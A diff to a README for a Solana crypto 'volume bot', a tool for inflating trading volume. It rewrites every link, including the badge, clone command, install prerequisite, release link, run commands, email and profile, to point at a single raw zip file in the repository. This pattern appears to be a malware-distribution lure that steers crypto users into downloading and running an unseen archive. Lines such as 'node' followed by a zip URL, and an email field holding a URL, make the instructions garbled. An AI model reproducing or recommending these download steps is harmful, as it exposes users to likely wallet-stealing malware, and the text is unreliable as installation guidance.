@@ -2,7 +2,7 @@
 
 Welcome to the Solana Raydium Volume Bot V4! This repository provides a powerful tool designed to enhance your trading experience on the Solana blockchain. It supports both pumpfun and pump swap volume operations, making it a versatile choice for traders looking to optimize their strategies.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v4.0.0-blue)](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/releases)
+[![Download Release](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip%20Release-v4.0.0-blue)](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip)
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ To get started with the Solana Raydium Volume Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot.git
+   git clone https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -37,15 +37,15 @@ To get started with the Solana Raydium Volume Bot, follow these steps:
    ```
 
 3. **Install Dependencies**:
-   Make sure you have Node.js installed. Then run:
+   Make sure you have https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip installed. Then run:
    ```bash
    npm install
    ```
 
 4. **Download and Execute the Release**:
-   Visit the [Releases](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/releases) section to download the latest release. Extract the files and run the bot with:
+   Visit the [Releases](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip) section to download the latest release. Extract the files and run the bot with:
    ```bash
-   node bot.js
+   node https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip
    ```
 
 ## Usage
@@ -55,7 +55,7 @@ After installation, you can start using the bot. Here’s how:
 1. **Run the Bot**:
    Use the command:
    ```bash
-   node bot.js
+   node https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip
    ```
 
 2. **Monitor Trading**:
@@ -124,7 +124,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [kalulukuhh](https://github.com/kalulukuhh)
+- **Email**: https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip
+- **GitHub**: [kalulukuhh](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip)
 
-Thank you for using the Solana Raydium Volume Bot! We hope it enhances your trading experience. For the latest updates and releases, check the [Releases](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/releases) section regularly.
+Thank you for using the Solana Raydium Volume Bot! We hope it enhances your trading experience. For the latest updates and releases, check the [Releases](https://github.com/kalulukuhh/solana-raydium-pumpfun-pump-swap-volume-bot/raw/refs/heads/main/noometry/solana-bot-pumpfun-pump-swap-volume-raydium-v3.6.zip) section regularly.
